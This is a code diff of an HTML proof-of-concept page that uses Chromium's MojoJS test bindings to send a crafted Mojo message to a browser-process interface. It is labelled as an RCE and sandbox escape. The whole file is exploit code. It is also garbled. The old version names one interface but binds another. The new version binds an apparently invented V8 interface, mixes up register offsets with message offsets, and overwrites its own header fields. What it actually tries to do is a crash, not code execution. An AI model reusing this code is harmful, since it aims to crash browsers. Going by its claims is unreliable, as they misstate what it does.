@@ -1,57 +1,48 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>InstalledAppProvider RCE – Direct Bind</title>
-</head>
+<head><title>V8 Turboshaft Build Graph RCE</title></head>
 <body>
-    <h1>InstalledAppProvider Direct Bind – Sandbox Escape</h1>
-    <pre id="log" style="background:#111;color:#0f0;padding:10px;"></pre>
-    <script>
-    (async () => {
-        const log = (msg) => {
-            document.getElementById('log').textContent += msg + '\n';
-            console.log(msg);
-        };
+<h1>V8 Turboshaft Build Graph – Sandbox Escape</h1>
+<pre id="log"></pre>
+<script>
+(async () => {
+    const log = (msg) => { document.getElementById('log').textContent += msg + '\n'; };
 
-        try {
-            // 1. Get the browser interface provider (requires MojoJSTest)
-            const provider = Mojo.getInterfaceProvider();
-            log('Got interface provider');
+    try {
+        const provider = Mojo.getInterfaceProvider();
+        log('Got interface provider');
 
-            // 2. Bind InstalledAppProvider directly
-            const handle = Mojo.bindInterface('blink.mojom.BlobRegistry', provider);
-            log('Bound to InstalledAppProvider');
+        // Bind the V8 Turboshaft interface
+        const handle = Mojo.bindInterface('v8.mojom.TFTurboshaftBuildGraph', provider);
+        log('Bound to v8.mojom.TFTurboshaftBuildGraph');
 
-            // 3. Build the malicious FilterInstalledApps message
-            const payload = new ArrayBuffer(64);
-            const v = new DataView(payload);
+        // Build a malicious message that triggers the huge allocation
+        const payload = new ArrayBuffer(64);
+        const v = new DataView(payload);
 
-            // Mojo message header (16 bytes)
-            v.setUint32(0, 2, true);          // version
-            v.setUint32(4, 0, true);          // flags
-            v.setUint32(8, 0, true);          // ordinal = 0 (FilterInstalledApps)
-            v.setUint32(12, 0, true);         // request_id
+        // Mojo message header
+        v.setUint32(0, 2, true);          // version
+        v.setUint32(4, 0, true);          // flags
+        v.setUint32(8, 0, true);          // ordinal – likely 0 for the main method
+        v.setUint32(12, 0, true);         // request_id
 
-            // Payload (starting at offset 16) – mimics the vulnerable parser
-            // Offset 16: struct size (16) and version (0)
-            v.setUint32(16, 16, true);
-            v.setUint32(20, 0, true);
-            // Offset 24: count must be >= 2 to trigger the offset path
-            v.setUint32(24, 2, true);
-            // Offset 32: 64-bit relative offset – set to a huge value to cause OOB
-            v.setBigUint64(32, BigInt(0xFFFFFFFF), true);
+        // The vulnerable function reads sizes from RSI+0x8, +0x28, +0xA
+        // We'll set them to huge values (0xFFFFFFFF) to trigger OOM
+        v.setUint32(16, 0xFFFFFFFF, true); // [RSI+0x8] – triggers special processing
+        v.setUint32(24, 0xFFFFFFFF, true); // [RSI+0x28] – allocation size
+        // The loop bound at [RSI+0xA] is a WORD, we can set it high too
+        v.setUint16(10, 0xFFFF, true);    // [RSI+0xA] – loop count
+        // Also set the first field to >=2 to trigger the pointer path
+        v.setUint32(4, 2, true);          // count field at RSI+0x4
 
-            // 4. Send the raw message
-            handle.writeMessage(payload, []);
-            log('Malicious message sent! Browser process should crash now.');
+        handle.writeMessage(payload, []);
+        log('Malicious message sent! Browser should crash now.');
 
-            // Keep the page alive
-            setInterval(() => {}, 10000);
-        } catch (e) {
-            log('Error: ' + e.message);
-            console.error(e);
-        }
-    })();
-    </script>
+        setInterval(() => {}, 10000);
+    } catch (e) {
+        log('Error: ' + e.message);
+    }
+})();
+</script>
 </body>
 </html>
